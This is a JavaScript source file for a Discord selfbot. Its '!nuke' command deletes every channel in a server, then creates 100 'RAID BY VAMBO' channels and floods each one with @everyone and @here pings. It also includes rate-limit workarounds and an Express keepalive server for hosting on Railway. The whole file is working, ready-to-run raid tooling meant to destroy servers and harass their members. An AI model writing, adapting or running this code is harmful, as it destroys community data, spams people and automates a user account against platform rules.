const { Client } = require('discord.js-selfbot-v13');
const client = new Client();

// Use environment variable for security
const TOKEN = process.env.DISCORD_TOKEN;
const PREFIX = '!';

// Web server for Railway
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.send('Nuke selfbot is running!');
});

app.listen(PORT, () => {
    console.log(`Web server running on port ${PORT}`);
});

client.on('ready', () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
    console.log(`Selfbot is ready in ${client.guilds.cache.size} servers`);
    console.log(`Type !nuke in any channel to destroy the server`);
});

client.on('messageCreate', async (message) => {
    // Only respond to your own messages
    if (message.author.id !== client.user.id) return;
    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // ===== FULL NUKE COMMAND =====
    if (command === 'nuke') {
        const guild = message.guild;
        if (!guild) {
            message.reply('This command only works in servers!');
            return;
        }

        // Confirm message
        message.reply('💣 **NUKE INITIATED** - Deleting ALL channels...');
        console.log(`Starting nuke on ${guild.name}`);

        // ===== STEP 1: DELETE ALL CHANNELS =====
        let deletedCount = 0;
        let deleteFailed = 0;
        
        // Get all channels (text, voice, categories, etc.)
        const channels = [...guild.channels.cache.values()];
        
        for (const channel of channels) {
            try {
                await channel.delete();
                deletedCount++;
                console.log(`✅ Deleted: ${channel.name} (${channel.type})`);
                
                // Small delay to avoid rate limiting
                await new Promise(resolve => setTimeout(resolve, 800));
                
            } catch (error) {
                deleteFailed++;
                console.error(`❌ Failed to delete ${channel.name}:`, error.message);
            }
        }
        
        console.log(`✅ Phase 1 complete: Deleted ${deletedCount} channels, Failed: ${deleteFailed}`);

        // ===== STEP 2: CREATE 100 RAID CHANNELS =====
        message.reply(`🔥 Deleted ${deletedCount} channels. Now creating **100 RAID CHANNELS**...`);
        
        // Channel name with Zalgo text
        const channelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';
        
        // Raid message with @everyone and @here pings
        const raidMessage = `@everyone @here **RAIDED BY VAMBO**

### NEVER SCAM AGAIN SON😂
            😯KICK ROCKS😯
https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;

        let createdCount = 0;
        let createFailed = 0;

        // Create 100 channels
        for (let i = 1; i <= 100; i++) {
            try {
                // Create channel with number (e.g., "R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉-1")
                const newChannel = await guild.channels.create(`${channelName}-${i}`, {
                    type: 'text' // 0 = text channel
                });
                
                // Send raid message with pings
                await newChannel.send(raidMessage);
                
                createdCount++;
                console.log(`✅ Created channel ${i}/100: ${newChannel.name}`);
                
                // Delay to avoid rate limiting (Discord allows ~1 channel per second)
                await new Promise(resolve => setTimeout(resolve, 1200));
                
            } catch (error) {
                createFailed++;
                console.error(`❌ Failed to create channel ${i}:`, error.message);
                
                // If rate limited, wait longer
                if (error.message.includes('rate')) {
                    console.log('⏳ Rate limited, waiting 5 seconds...');
                    await new Promise(resolve => setTimeout(resolve, 5000));
                }
            }
        }

        // ===== STEP 3: FINAL ANNOUNCEMENT =====
        try {
            // Try to create one final announcement channel
            const finalChannel = await guild.channels.create('NUKE-COMPLETE', {
                type: 'text'
            });
            
            await finalChannel.send(`@everyone **NUKE COMPLETE!**

🔥 **RESULTS:**
✅ Deleted: ${deletedCount} channels
✅ Created: ${createdCount} raid channels
❌ Failed deletions: ${deleteFailed}
❌ Failed creations: ${createFailed}

**RAIDED BY VAMBO** 💀`);
            
        } catch (error) {
            console.log('Could not create final announcement channel');
        }

        // Log final results
        console.log('='.repeat(50));
        console.log('💀 **NUKE COMPLETE** 💀');
        console.log(`✅ Deleted: ${deletedCount} channels`);
        console.log(`✅ Created: ${createdCount} raid channels`);
        console.log(`❌ Delete failures: ${deleteFailed}`);
        console.log(`❌ Create failures: ${createFailed}`);
        console.log('='.repeat(50));
    }
});

client.login(TOKEN);
